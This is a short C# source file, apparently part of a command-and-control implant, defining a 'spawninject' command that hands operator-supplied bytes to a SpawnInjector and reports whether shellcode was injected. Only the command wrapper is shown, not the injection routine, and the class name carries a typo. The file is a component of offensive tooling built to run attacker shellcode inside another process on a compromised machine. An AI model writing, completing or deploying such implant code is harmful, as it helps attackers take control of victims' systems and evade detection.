using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SpawwnInject : AgentCommand
    {
        public override string Name => "spawninject";

        public override string Execute(AgentTask task)
        {
            var injector = new SpawnInjector();
            var success = injector.Inject(task.FileBytes);

            if (success) return "Shellcode injected";
            return "Fail to inject shellcode";
        }
    }
}
